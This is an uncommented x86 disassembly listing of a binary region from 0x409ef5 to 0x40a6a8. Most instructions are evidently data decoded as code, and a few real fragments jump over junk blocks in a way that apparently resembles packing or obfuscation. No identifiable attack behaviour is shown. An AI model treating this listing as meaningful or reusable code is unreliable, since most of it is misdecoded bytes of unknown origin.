  409ef5:	js     0x409f3e
  409ef7:	inc    ebp
  409ef8:	mov    cl,0x65
  409efa:	dec    eax
  409efb:	jo     0x409f66
  409efd:	popa   
  409efe:	mov    eax,0xf65f72f6
  409f03:	jnp    0x409e8e
  409f05:	or     eax,0x388955c2
  409f0a:	pop    ss
  409f0b:	dec    ah
  409f0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f0e:	and    DWORD PTR [edi+0x399f4ea0],eax
  409f14:	sub    eax,0x44472f3e
  409f19:	clc    
  409f1a:	mov    bh,0x2
  409f1c:	mov    ds:0x4921505,al
  409f21:	xor    BYTE PTR [ecx+0x50],ch
  409f24:	cmp    ch,BYTE PTR [esi-0x1fcec0a8]
  409f2a:	dec    edi
  409f2b:	into   
  409f2c:	fistp  WORD PTR ds:0x1def01e0
  409f32:	xchg   DWORD PTR [ebx-0x45],esp
  409f35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f36:	fmul   QWORD PTR [ebp-0x14]
  409f39:	sbb    al,0x64
  409f3b:	jb     0x409eee
  409f3d:	push   cs
  409f3e:	mov    bl,0xf0
  409f40:	retf   0xda28
  409f43:	retf   0xa4de
  409f46:	fldenv [edx+0x32]
  409f49:	sub    ch,BYTE PTR [edi]
  409f4b:	sub    al,0xb3
  409f4d:	data16 add BYTE PTR [eax+esi*8],ah
  409f51:	xchg   ebp,eax
  409f52:	xor    DWORD PTR [ebx-0x27],edi
  409f55:	or     ebx,DWORD PTR [ebx]
  409f57:	and    al,0xa5
  409f59:	push   cx
  409f5b:	jg     0x409f71
  409f5d:	add    al,0x45
  409f5f:	jecxz  0x409ef8
  409f61:	cmp    edi,DWORD PTR [esi]
  409f63:	outs   dx,BYTE PTR ds:[esi]
  409f64:	jp     0x409ef3
  409f66:	push   esi
  409f67:	mov    WORD PTR [ebp-0x74],es
  409f6a:	add    dh,dh
  409f6c:	jge    0x409f11
  409f6e:	jmp    0x20f:0x96e1b469
  409f75:	and    DWORD PTR [esi],eax
  409f77:	sbb    DWORD PTR [esi-0x750a3102],edx
  409f7d:	enter  0x6224,0xb8
  409f81:	cs out 0x40,al
  409f84:	out    0x3b,al
  409f86:	xor    bh,BYTE PTR [esi]
  409f88:	or     BYTE PTR [eax+0x5e],0xcd
  409f8c:	pop    ds
  409f8d:	or     eax,0xd725bed3
  409f92:	mov    ebx,DWORD PTR [esi+0x6d]
  409f95:	or     bh,al
  409f97:	mov    edi,0x2bca8b8e
  409f9c:	xlat   BYTE PTR ds:[ebx]
  409f9d:	lea    ebx,[eax]
  409f9f:	dec    ebp
  409fa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fa1:	bound  esi,QWORD PTR [ecx]
  409fa3:	lahf   
  409fa4:	and    DWORD PTR [edx],0xef8b09fd
  409faa:	mov    esp,0xb599ae3c
  409faf:	sti    
  409fb0:	cmp    ebp,esp
  409fb2:	cmp    cl,ah
  409fb4:	push   ecx
  409fb5:	sbb    al,0xc2
  409fb7:	add    eax,edx
  409fb9:	pop    esp
  409fba:	mov    esp,0xce5d95a4
  409fbf:	outs   dx,BYTE PTR ds:[esi]
  409fc0:	ret    
  409fc1:	(bad)  
  409fc2:	fisttp QWORD PTR [ebp+0x144b3201]
  409fc8:	ror    ebp,cl
  409fca:	sbb    DWORD PTR [edx-0x6edd6c15],edi
  409fd0:	sbb    BYTE PTR [edi-0x46],bh
  409fd3:	les    ebx,FWORD PTR ds:[ecx-0x5f]
  409fd7:	stc    
  409fd8:	mov    dh,0xa4
  409fda:	jmp    0xd5ec:0xcf850d2e
  409fe1:	jle    0x409fcb
  409fe3:	pop    es
  409fe4:	out    0x10,al
  409fe6:	pop    esi
  409fe7:	dec    edx
  409fe8:	or     ebx,esp
  409fea:	inc    ecx
  409feb:	and    dl,BYTE PTR ds:[edi-0x416b6861]
  409ff2:	jecxz  0x409fbf
  409ff4:	ja     0x409fd1
  409ff6:	pusha  
  409ff7:	ret    
  409ff8:	loope  0x40a075
  409ffa:	mov    ds:0xe9c56472,al
  409fff:	das    
  40a000:	dec    edx
  40a001:	push   ebp
  40a002:	xchg   bh,cl
  40a004:	dec    ebp
  40a005:	test   DWORD PTR [esp+edi*1-0x2d],edx
  40a009:	ret    0x6040
  40a00c:	loopne 0x40a01f
  40a00e:	pop    ebx
  40a00f:	neg    DWORD PTR [edi+eax*4]
  40a012:	test   eax,0xfe14d67e
  40a017:	jle    0x40a01d
  40a019:	or     ebx,edx
  40a01b:	jbe    0x409fbf
  40a01d:	scas   eax,DWORD PTR es:[edi]
  40a01e:	mov    eax,0x3094a537
  40a023:	nop
  40a024:	jge    0x40a086
  40a026:	int    0x89
  40a028:	mov    edi,0x44a97280
  40a02d:	adc    BYTE PTR [ebx+ebp*8-0x64],0x8a
  40a032:	push   ds
  40a033:	jo     0x409fdc
  40a035:	(bad)  
  40a036:	repnz fild WORD PTR [eax]
  40a039:	lahf   
  40a03a:	pusha  
  40a03b:	(bad)  
  40a03c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a03d:	dec    edx
  40a03e:	lahf   
  40a03f:	(bad)  
  40a040:	xor    edi,DWORD PTR [edi+0x4d]
  40a043:	sub    eax,DWORD PTR [eax]
  40a045:	outs   dx,BYTE PTR ds:[esi]
  40a046:	repz iret 
  40a048:	popf   
  40a049:	imul   ecx,DWORD PTR [edi],0x687216c0
  40a04f:	xchg   DWORD PTR [esi+0x5ddf8d66],esp
  40a055:	and    DWORD PTR [ecx+eiz*4-0x770269e0],edx
  40a05c:	pushf  
  40a05d:	sub    al,0xc0
  40a05f:	cvtps2pi mm5,QWORD PTR [ebp-0x1d03fdff]
  40a066:	pop    ds
  40a067:	sbb    esi,esp
  40a069:	or     eax,ecx
  40a06b:	lds    esi,FWORD PTR [esi]
  40a06d:	xchg   edi,eax
  40a06e:	adc    ah,BYTE PTR [eax+esi*4]
  40a071:	call   0xded4:0x63ed22cd
  40a078:	add    edi,DWORD PTR [ecx-0x1ac6a76b]
  40a07e:	xor    edx,edi
  40a080:	mov    DWORD PTR [esi-0x24],esp
  40a083:	xor    ah,BYTE PTR [ebx-0x47]
  40a086:	xchg   DWORD PTR [ebp+0x41],ecx
  40a089:	sub    eax,0xde148e23
  40a08e:	cs mov cl,0xaf
  40a091:	dec    esi
  40a092:	ret    
  40a093:	fld    st(5)
  40a095:	(bad)  
  40a096:	cdq    
  40a097:	ins    BYTE PTR es:[edi],dx
  40a098:	outs   dx,BYTE PTR ds:[esi]
  40a099:	cmp    ecx,ecx
  40a09b:	rol    DWORD PTR [eax+0x0],1
  40a09e:	addr16 iret 
  40a0a0:	jl     0x40a06e
  40a0a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0a3:	mov    ebp,DWORD PTR ds:[edi]
  40a0a6:	ret    
  40a0a7:	sbb    ah,BYTE PTR [ebx-0x59]
  40a0aa:	fld    TBYTE PTR [ecx+0x3c]
  40a0ad:	shl    BYTE PTR [edx],cl
  40a0af:	xchg   edi,eax
  40a0b0:	pop    es
  40a0b1:	les    ecx,FWORD PTR [ebx]
  40a0b3:	retf   
  40a0b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0b5:	sub    eax,0x68da67fd
  40a0ba:	data16 cli 
  40a0bc:	popf   
  40a0bd:	call   0xe87f:0xd4b31d35
  40a0c4:	in     eax,0xf8
  40a0c6:	add    eax,0x2478151d
  40a0cb:	test   ebp,ebp
  40a0cd:	into   
  40a0ce:	mov    eax,ds:0xbcbb9ea4
  40a0d3:	ret    
  40a0d4:	sub    al,0x2f
  40a0d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0d7:	cli    
  40a0d8:	sub    al,0xf1
  40a0da:	inc    ebx
  40a0db:	cmovo  esi,DWORD PTR [edi-0x510ae1ba]
  40a0e2:	mov    ds:0x1a0c877d,al
  40a0e7:	pop    es
  40a0e8:	out    0x7,eax
  40a0ea:	sub    al,0x79
  40a0ec:	retf   
  40a0ed:	stc    
  40a0ee:	mov    ecx,0x558b376f
  40a0f3:	in     al,dx
  40a0f4:	shrd   eax,edx,0x2
  40a0f8:	xor    eax,ecx
  40a0fa:	mov    ecx,DWORD PTR [ebp-0x18]
  40a0fd:	shr    edx,0x2
  40a100:	mov    edx,DWORD PTR [ebp-0x14]
  40a103:	xor    edx,edx
  40a105:	shl    ecx,0x1e
  40a108:	or     eax,edx
  40a10a:	mov    ds:0x4227c0,eax
  40a10f:	pop    esi
  40a110:	leave  
  40a111:	ret    
  40a112:	push   ebp
  40a113:	mov    ebp,esp
  40a115:	sub    esp,0x28
  40a118:	push   ebx
  40a119:	push   esi
  40a11a:	push   edi
  40a11b:	mov    DWORD PTR [ebp-0x10],0x67e2
  40a122:	jmp    0x40a3b9
  40a127:	mov    al,ds:0xfc9cf9a5
  40a12c:	pushf  
  40a12d:	mov    al,ds:0xd54f94b9
  40a132:	jecxz  0x40a104
  40a134:	inc    ebx
  40a135:	mov    al,0xcf
  40a137:	es xchg ebp,eax
  40a139:	mov    esi,0xbec2a9be
  40a13e:	mov    esi,0xc184e3cd
  40a143:	loopne 0x40a142
  40a145:	jp     0x40a19a
  40a147:	scas   al,BYTE PTR es:[edi]
  40a148:	mov    dh,0x8c
  40a14a:	inc    esp
  40a14b:	scas   al,BYTE PTR es:[edi]
  40a14c:	xchg   ebx,eax
  40a14d:	push   edi
  40a14e:	cmp    al,0x6c
  40a150:	mov    al,0x5b
  40a152:	repnz std 
  40a154:	nop
  40a155:	add    DWORD PTR [ecx-0x51],esp
  40a158:	(bad)  
  40a15a:	in     eax,0x9e
  40a15c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a15d:	push   esp
  40a15e:	cdq    
  40a15f:	fs pop es
  40a161:	sbb    al,0x75
  40a163:	in     al,dx
  40a164:	pop    esi
  40a165:	leave  
  40a166:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a167:	sahf   
  40a168:	jmp    0x1df81ebb
  40a16d:	add    bl,BYTE PTR [eax+eiz*8]
  40a170:	push   ss
  40a171:	mov    dh,ch
  40a173:	out    dx,al
  40a174:	xchg   esi,eax
  40a175:	push   ebx
  40a176:	stos   BYTE PTR es:[edi],al
  40a177:	mov    esi,0xab5973d0
  40a17c:	shr    ch,0xbf
  40a17f:	cdq    
  40a180:	push   ds
  40a181:	jge    0x40a1fb
  40a183:	ss dec edi
  40a185:	int    0x58
  40a187:	sar    DWORD PTR [ecx-0x33],0x86
  40a18b:	mov    WORD PTR [ebx],es
  40a18d:	jle    0x40a175
  40a18f:	test   DWORD PTR [esi],eax
  40a191:	test   BYTE PTR [edx+0x1],ch
  40a194:	fcom   DWORD PTR [edi-0x2b]
  40a197:	shr    BYTE PTR [eax-0x677f6fad],cl
  40a19d:	jae    0x40a203
  40a19f:	mov    ebp,0x6523e8c8
  40a1a4:	pop    ss
  40a1a5:	and    bh,BYTE PTR [eax]
  40a1a7:	adc    edi,DWORD PTR [eax]
  40a1a9:	shl    DWORD PTR [eax-0x45],0xf7
  40a1ad:	cmp    DWORD PTR [esi+0x3c32116e],ecx
  40a1b3:	mov    esi,DWORD PTR [eax+0x5be4efc2]
  40a1b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1ba:	mov    al,0xf5
  40a1bc:	sbb    ebx,ebp
  40a1be:	inc    ebx
  40a1bf:	mov    edi,0xacaef9ab
  40a1c4:	xchg   esi,eax
  40a1c5:	xchg   eax,esi
  40a1c7:	shl    DWORD PTR [ebp+0x7fbd9665],cl
  40a1cd:	repnz mov es,WORD PTR [edi-0x73]
  40a1d1:	mov    bh,0x17
  40a1d3:	or     DWORD PTR [edx-0x7ca9321c],ecx
  40a1d9:	xor    BYTE PTR [eax+ebx*2],bl
  40a1dc:	or     eax,0x33da4001
  40a1e1:	in     eax,dx
  40a1e2:	dec    edx
  40a1e3:	xor    eax,0x6f673d83
  40a1e8:	cs retf 
  40a1ea:	pop    edi
  40a1eb:	adc    ecx,DWORD PTR [eax-0x5a45cea3]
  40a1f1:	inc    edi
  40a1f2:	or     cl,BYTE PTR [edi+0x54]
  40a1f5:	adc    ebp,DWORD PTR [ebx]
  40a1f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1f8:	cmp    dl,BYTE PTR [edx-0x4fea2d9]
  40a1fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1ff:	mov    bl,0x92
  40a201:	xchg   ebp,eax
  40a202:	or     bh,BYTE PTR [esi-0x127b5504]
  40a208:	out    dx,al
  40a209:	mov    ds:0x3c17a818,eax
  40a20e:	call   0x3cb3:0x4bdd833a
  40a215:	sbb    eax,DWORD PTR [ecx+0x7fd6628b]
  40a21b:	pusha  
  40a21c:	cmpxchg DWORD PTR [eax-0x6aa62551],esi
  40a223:	sbb    cl,bl
  40a225:	and    edi,DWORD PTR [ebp+0x38f4c579]
  40a22b:	dec    esi
  40a22c:	mov    bl,0x3c
  40a22e:	aas    
  40a22f:	loop   0x40a22e
  40a231:	dec    edx
  40a232:	aaa    
  40a233:	mov    ecx,DWORD PTR [ebp+0x6f89318d]
  40a239:	pusha  
  40a23a:	fs xchg ebx,eax
  40a23c:	(bad)  
  40a23d:	in     al,dx
  40a23e:	arpl   WORD PTR [ebp-0x3f49c10b],di
  40a244:	mov    edi,0x5bfc5f6d
  40a249:	imul   ebp,edi,0x4f
  40a24c:	pop    ebp
  40a24d:	ss xchg ebp,eax
  40a24f:	fsubr  QWORD PTR [ecx+0x56]
  40a252:	shl    DWORD PTR [ecx],0x71
  40a255:	ins    BYTE PTR es:[edi],dx
  40a256:	jmp    0x913f:0xe3ad46ac
  40a25d:	cmp    DWORD PTR [esi+ebx*2-0x22],edx
  40a261:	ss sub dh,cl
  40a264:	hlt    
  40a265:	shr    BYTE PTR [esi+ebp*2+0x328b6718],cl
  40a26c:	and    al,0x37
  40a26e:	and    eax,0x6a39f768
  40a273:	int    0xd6
  40a275:	jg     0x40a26a
  40a277:	(bad)  
  40a278:	push   ebp
  40a279:	leave  
  40a27a:	and    al,0xe1
  40a27c:	stos   BYTE PTR es:[edi],al
  40a27d:	in     eax,dx
  40a27e:	push   edi
  40a27f:	inc    ebp
  40a280:	jmp    0xb79050b3
  40a285:	fdiv   st,st(7)
  40a287:	or     bh,BYTE PTR [ebp-0x6a]
  40a28a:	popa   
  40a28b:	addr16 es mov edi,0xb8b5fe1e
  40a292:	out    0xcf,al
  40a294:	icebp  
  40a295:	pop    edi
  40a296:	sbb    al,0x92
  40a298:	sbb    ebx,DWORD PTR [esi-0x1d]
  40a29b:	retf   
  40a29c:	pop    ds
  40a29d:	sbb    BYTE PTR [eax-0x394ef0c3],0x30
  40a2a4:	mov    ebx,0xb436ced1
  40a2a9:	mov    ecx,0x32d540b4
  40a2ae:	dec    eax
  40a2af:	mov    cl,al
  40a2b1:	(bad)  
  40a2b3:	inc    ebx
  40a2b4:	adc    BYTE PTR [esi+0x3e],dh
  40a2b7:	sti    
  40a2b8:	jo     0x40a2e1
  40a2ba:	mov    gs,WORD PTR [eax+0x62]
  40a2bd:	jecxz  0x40a27c
  40a2bf:	out    dx,eax
  40a2c0:	int    0x2b
  40a2c2:	cmp    ah,BYTE PTR [ebp+0x58d0268e]
  40a2c8:	loopne 0x40a347
  40a2ca:	mov    ch,BYTE PTR [esi-0x14ef1851]
  40a2d0:	inc    ebx
  40a2d1:	add    eax,0x3225a4b3
  40a2d6:	xor    DWORD PTR [edi+0x1f],ebp
  40a2d9:	jge    0x40a31c
  40a2db:	call   0x7ff7:0xd6a71a0
  40a2e2:	popf   
  40a2e3:	or     BYTE PTR [eax+0x64],dl
  40a2e6:	pusha  
  40a2e7:	inc    ecx
  40a2e8:	jle    0x40a2a8
  40a2ea:	and    BYTE PTR [ebx-0x6b6fdd2a],bh
  40a2f0:	sbb    DWORD PTR [esi-0x4],edi
  40a2f3:	adc    edi,ebp
  40a2f5:	lods   al,BYTE PTR ds:[esi]
  40a2f6:	mov    dl,0xb7
  40a2f8:	xchg   DWORD PTR [esi+0x16587b4c],esi
  40a2fe:	or     ebx,esi
  40a300:	xchg   BYTE PTR [edx+0x6b],ah
  40a303:	sub    BYTE PTR [ecx],dh
  40a305:	sub    ebx,ecx
  40a307:	push   ecx
  40a308:	lds    edi,FWORD PTR [edi+ebx*8+0x65ea1698]
  40a30f:	mov    es,WORD PTR [ecx+esi*2+0x1e]
  40a313:	xor    eax,0xaa922eec
  40a318:	ret    0xfce8
  40a31b:	sbb    al,0xf7
  40a31e:	cli    
  40a31f:	cld    
  40a320:	jb     0x40a335
  40a322:	loope  0x40a366
  40a324:	jecxz  0x40a335
  40a326:	cmp    dh,ch
  40a328:	rol    ebx,cl
  40a32a:	sub    al,0xfa
  40a32c:	test   BYTE PTR [ecx+0x1d],dl
  40a32f:	jge    0x40a36a
  40a331:	pop    ss
  40a332:	sub    dl,ch
  40a334:	xchg   edx,eax
  40a335:	mov    ds:0xd2653a80,eax
  40a33a:	mov    eax,?
  40a33c:	adc    ebx,esp
  40a33e:	enter  0x505f,0xf0
  40a342:	shl    BYTE PTR [esi+0x5c],0xa0
  40a346:	in     al,0x90
  40a348:	test   edx,ebx
  40a34a:	adc    al,BYTE PTR [ecx]
  40a34c:	jle    0x40a31b
  40a34e:	out    0x71,eax
  40a350:	cmp    ebp,DWORD PTR [esi-0x797f529f]
  40a356:	in     al,dx
  40a357:	mov    gs,ecx
  40a359:	mov    edi,0x8e4fc2a9
  40a35e:	test   al,0x77
  40a360:	pop    esp
  40a361:	mov    BYTE PTR ds:0xf7bc343a,dl
  40a367:	jge    0x40a301
  40a369:	sbb    al,BYTE PTR [ebx]
  40a36b:	imul   esp,DWORD PTR [ecx-0x60],0xffffff8e
  40a36f:	push   eax
  40a370:	outs   dx,BYTE PTR ds:[esi]
  40a371:	mov    ds,WORD PTR [eax+ebp*1-0x27]
  40a375:	mov    eax,0xa2dcbe71
  40a37a:	dec    edi
  40a37b:	mov    al,ds:0x1b21e583
  40a380:	repz mov ah,0x4d
  40a383:	clc    
  40a384:	mov    edi,0x3f7bdc36
  40a389:	je     0x40a33b
  40a38b:	jge    0x40a3f7
  40a38d:	mov    BYTE PTR [ebx+0x7d71735e],cl
  40a393:	dec    edx
  40a394:	pusha  
  40a395:	and    bl,BYTE PTR [edi+esi*2+0x15]
  40a399:	fistp  WORD PTR [eax]
  40a39b:	ror    eax,0x77
  40a39e:	pop    esi
  40a39f:	(bad)  
  40a3a0:	cmp    al,0x59
  40a3a2:	mov    dh,0x63
  40a3a4:	xchg   ebp,eax
  40a3a5:	stos   BYTE PTR es:[edi],al
  40a3a6:	mov    al,ds:0x268fe79e
  40a3ab:	ret    0xbe69
  40a3ae:	cmp    eax,0x21e50588
  40a3b3:	inc    eax
  40a3b4:	add    al,0xf5
  40a3b6:	lea    ebp,ds:0xfc45c799
  40a3bc:	es inc edi
  40a3be:	add    BYTE PTR [eax],al
  40a3c0:	mov    DWORD PTR [ebp-0x8],0x580
  40a3c7:	mov    DWORD PTR [ebp-0xc],0x5f3e
  40a3ce:	mov    DWORD PTR [ebp-0x28],0x3294
  40a3d5:	mov    DWORD PTR [ebp-0x24],0x643
  40a3dc:	mov    DWORD PTR [ebp-0x20],0x2545
  40a3e3:	mov    DWORD PTR [ebp-0x1c],0x43ab
  40a3ea:	xor    ebx,ebx
  40a3ec:	inc    ebx
  40a3ed:	jmp    0x40a684
  40a3f2:	ins    DWORD PTR es:[edi],dx
  40a3f3:	shr    ebx,0x9a
  40a3f6:	jl     0x40a3b4
  40a3f8:	scas   eax,DWORD PTR es:[edi]
  40a3f9:	sub    bl,BYTE PTR [ebx+ebp*1-0x7a]
  40a3fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3fe:	fbstp  TBYTE PTR [ebx+0x4]
  40a401:	fst    QWORD PTR [ecx]
  40a403:	fwait
  40a404:	mov    esi,0xbec2a9be
  40a409:	mov    esi,0x8cd3a08e
  40a40e:	sbb    BYTE PTR [ebp+0x5f76375f],ah
  40a414:	scas   eax,DWORD PTR es:[edi]
  40a415:	or     BYTE PTR [ecx+0x1893e66d],ah
  40a41b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a41c:	mov    ebx,0x9ed82d98
  40a421:	cld    
  40a422:	mov    al,ds:0xc55bb21f
  40a427:	pop    ebp
  40a428:	jnp    0x40a44e
  40a42a:	mov    edi,DWORD PTR [ebx-0x38560eac]
  40a430:	aad    0x93
  40a432:	dec    ebp
  40a433:	jmp    0xfb10e57e
  40a438:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a439:	stos   DWORD PTR es:[edi],eax
  40a43a:	push   ebx
  40a43b:	sub    DWORD PTR [ebx+0x23],edi
  40a43e:	stos   BYTE PTR es:[edi],al
  40a43f:	and    DWORD PTR [eax+0x62999bc2],eax
  40a445:	mov    ds:0xdccf60f0,eax
  40a44a:	cdq    
  40a44b:	arpl   WORD PTR ds:0x9815db15,sp
  40a451:	add    ecx,ebp
  40a453:	fcmovu st,st(3)
  40a455:	xor    al,0x91
  40a457:	int3   
  40a458:	push   0x3d95f793
  40a45d:	fnsave [ebx]
  40a45f:	jmp    0x312d:0xb31c06a7
  40a466:	xchg   DWORD PTR [eax-0x6d613f52],eax
  40a46c:	pushf  
  40a46d:	add    al,0x81
  40a46f:	inc    ebx
  40a470:	jae    0x40a434
  40a472:	dec    esi
  40a473:	ror    BYTE PTR [edx],0x7b
  40a476:	xchg   esi,eax
  40a477:	sbb    cl,bh
  40a479:	xor    DWORD PTR [ecx],edx
  40a47b:	call   0x9137:0x5c1e5f17
  40a482:	pop    esp
  40a483:	sahf   
  40a484:	sbb    DWORD PTR [ebx],ebx
  40a486:	push   esi
  40a487:	pop    ecx
  40a488:	cwde   
  40a489:	aam    0xe1
  40a48b:	(bad)
  40a48e:	fs push eax
  40a490:	in     eax,dx
  40a491:	and    DWORD PTR [ebx+0x12c57267],esi
  40a497:	sbb    BYTE PTR [eax],ah
  40a499:	or     al,0x3
  40a49b:	jge    0x40a4b5
  40a49d:	inc    esp
  40a49e:	pushf  
  40a49f:	adc    al,0x58
  40a4a1:	loop   0x40a4e9
  40a4a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4a4:	mov    ah,0x3
  40a4a6:	je     0x40a4da
  40a4a8:	mov    esp,0x46e0d8aa
  40a4ad:	fist   DWORD PTR [eax-0x4d2d6b0d]
  40a4b3:	or     eax,0xf442f570
  40a4b8:	sbb    DWORD PTR [ecx-0x34558e5e],esp
  40a4be:	fstp   st(4)
  40a4c0:	cmp    DWORD PTR [esi],eax
  40a4c2:	xchg   edx,eax
  40a4c3:	sbb    ebx,DWORD PTR [edx]
  40a4c5:	push   cs
  40a4c6:	aad    0x64
  40a4c8:	mov    ebp,0xdcf247e1
  40a4cd:	sub    ecx,ecx
  40a4cf:	mov    eax,0x161b9667
  40a4d4:	lea    edx,[esi]
  40a4d6:	xchg   esi,eax
  40a4d7:	ret    
  40a4d8:	dec    DWORD PTR [ecx-0x3e]
  40a4db:	imul   esi,DWORD PTR [eax+eax*2],0x2555ab64
  40a4e2:	add    ecx,DWORD PTR [ebx-0x28d4a9b9]
  40a4e8:	inc    ecx
  40a4e9:	fs gs aas 
  40a4ec:	or     al,0x77
  40a4ee:	mov    esp,0x96bfad0f
  40a4f3:	pop    ds
  40a4f4:	push   es
  40a4f5:	xchg   ecx,eax
  40a4f6:	stc    
  40a4f7:	imul   ecx,DWORD PTR [edx+0x45cf30dc],0x7b
  40a4fe:	and    bl,ch
  40a500:	jl     0x40a4f8
  40a502:	mov    edi,0xc46b4793
  40a507:	lea    eax,[edx+0x5c]
  40a50a:	lods   eax,DWORD PTR ds:[esi]
  40a50b:	pop    edx
  40a50c:	fld    DWORD PTR [edx-0x4ab1e695]
  40a512:	out    0xd8,al
  40a514:	pop    ebp
  40a515:	xchg   bl,cl
  40a517:	lock sub DWORD PTR [edi-0x31],ecx
  40a51b:	sbb    eax,0xb84fc852
  40a520:	adc    ecx,eax
  40a522:	mov    eax,DWORD PTR [eax+edx*4+0x72]
  40a526:	and    esp,eax
  40a528:	lds    ecx,FWORD PTR [ebp+0x4fe957ef]
  40a52e:	xor    esi,DWORD PTR [edx+0x77]
  40a531:	ss and al,0x59
  40a534:	mov    dh,0xba
  40a536:	ins    DWORD PTR es:[edi],dx
  40a537:	aas    
  40a538:	pop    ebx
  40a539:	adc    esi,DWORD PTR [edi-0x334da8f7]
  40a53f:	mov    esp,0x5952600e
  40a544:	mov    ds:0x66d52e36,eax
  40a549:	dec    edx
  40a54a:	mov    esi,0xe2d000d4
  40a54f:	xor    BYTE PTR [edi-0x3cc04df9],dh
  40a555:	sbb    ah,bl
  40a557:	jl     0x40a4fc
  40a559:	mov    cl,0xf9
  40a55b:	in     eax,dx
  40a55c:	add    ch,BYTE PTR [esi-0x445c84e1]
  40a562:	add    dl,BYTE PTR [edx+0x27176e82]
  40a568:	stos   DWORD PTR es:[edi],eax
  40a569:	dec    edi
  40a56a:	xor    al,0x74
  40a56c:	pop    ss
  40a56d:	mov    ds:0x9788ca15,al
  40a572:	push   ds
  40a573:	repz cmp BYTE PTR [ebx+0x7089d10],ah
  40a57a:	in     al,dx
  40a57b:	cmp    al,0xb1
  40a57d:	shr    BYTE PTR [edi-0x6f67dc26],0xf4
  40a584:	inc    ebx
  40a585:	ficom  DWORD PTR [ebp-0x74211b73]
  40a58b:	jecxz  0x40a561
  40a58d:	data16 mov ah,0xff
  40a590:	sbb    BYTE PTR [ebp-0x73],0x69
  40a594:	mov    edx,0x91683315
  40a599:	xchg   ebx,ecx
  40a59b:	push   ecx
  40a59c:	pop    ebp
  40a59d:	adc    al,0x3c
  40a59f:	jle    0x40a52c
  40a5a1:	ins    BYTE PTR es:[edi],dx
  40a5a2:	jne    0x40a5fc
  40a5a4:	das    
  40a5a5:	imul   edi,DWORD PTR [edx+0x51],0x26
  40a5a9:	iret   
  40a5aa:	enter  0xf0b3,0xdf
  40a5ae:	(bad)  
  40a5af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5b0:	imul   edx,DWORD PTR [edx],0xffffffde
  40a5b3:	mov    edi,0x74bd75db
  40a5b8:	rsm    
  40a5ba:	mov    ax,0x8ff3
  40a5be:	mov    eax,0xe0c62473
  40a5c3:	jbe    0x40a641
  40a5c5:	ret    0x6e8b
  40a5c8:	ds nop
  40a5ca:	jle    0x40a5e9
  40a5cc:	xchg   ebx,eax
  40a5cd:	popa   
  40a5ce:	mov    ch,0xb6
  40a5d0:	repz mov cl,0x88
  40a5d3:	retf   
  40a5d4:	push   cs
  40a5d5:	cmp    eax,0xf86c9920
  40a5da:	add    dl,BYTE PTR [edi-0x90cc6ed]
  40a5e0:	xor    BYTE PTR [ecx+eiz*2-0x5d],bh
  40a5e4:	das    
  40a5e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5e6:	jbe    0x40a612
  40a5e8:	mov    bh,0x5f
  40a5ea:	jnp    0x40a64f
  40a5ec:	sub    BYTE PTR [esi+0x122fa7e4],bl
  40a5f2:	dec    edx
  40a5f3:	adc    ah,0x5b
  40a5f6:	repnz cld 
  40a5f8:	push   0x2
  40a5fa:	push   es
  40a5fb:	ret    0x655d
  40a5fe:	push   ds
  40a5ff:	jno    0x40a679
  40a601:	es or  eax,0x83693c66
  40a607:	adc    al,0xda
  40a609:	cmp    BYTE PTR [esi+0x7c],ch
  40a60c:	inc    BYTE PTR [ebp+ebx*4-0x69]
  40a610:	push   0x3d2293d7
  40a615:	aam    0xd
  40a617:	jg     0x40a5d8
  40a619:	fdivr  QWORD PTR [esp+eax*2+0x72]
  40a61d:	fxch   st(3)
  40a61f:	cli    
  40a620:	test   eax,0x5b6072cc
  40a625:	aas    
  40a626:	sahf   
  40a627:	sub    DWORD PTR [ebx-0x2f],esp
  40a62a:	neg    ch
  40a62c:	sbb    al,0x92
  40a62e:	push   esp
  40a62f:	ror    BYTE PTR [ecx+0x22],0xb3
  40a633:	xor    BYTE PTR [ebp+0x37],dh
  40a636:	(bad)  
  40a637:	in     eax,0x39
  40a639:	jo     0x40a684
  40a63b:	jo     0x40a5e1
  40a63d:	(bad)  
  40a63f:	and    DWORD PTR [ecx],ebp
  40a641:	jmp    0x202fa7a6
  40a646:	lock add eax,0xcd4ddd0
  40a64c:	xchg   DWORD PTR [ebp+eiz*1-0x6b],esi
  40a650:	mov    ecx,0xf238f1b6
  40a655:	loope  0x40a65c
  40a657:	sub    BYTE PTR [edi],0xd9
  40a65a:	call   0x5f0a6453
  40a65f:	(bad)  [esi]
  40a661:	jo     0x40a625
  40a663:	jns    0x40a676
  40a665:	adc    DWORD PTR [esp+edi*4+0x23],esi
  40a669:	sbb    DWORD PTR [ebp+0x47eb23b9],esi
  40a66f:	call   0x5201b18e
  40a674:	pop    ebp
  40a675:	jmp    0xa8bb:0x6e7cc9f0
  40a67c:	pushf  
  40a67d:	add    eax,0xa33f1254
  40a682:	push   ebp
  40a683:	push   esp
  40a684:	mov    DWORD PTR [ebp-0x18],ebx
  40a687:	mov    DWORD PTR [ebp-0x14],0x76b1
  40a68e:	mov    ecx,DWORD PTR [ebp-0x8]
  40a691:	mov    eax,DWORD PTR [ebp-0x4]
  40a694:	sub    ecx,eax
  40a696:	add    ecx,DWORD PTR [ebp-0xc]
  40a699:	add    ecx,DWORD PTR [ebp-0x10]
  40a69c:	imul   ecx,ecx,0x1f80
  40a6a2:	add    ecx,0x727e
  40a6a8:	xor    ecx,0x106c92f2
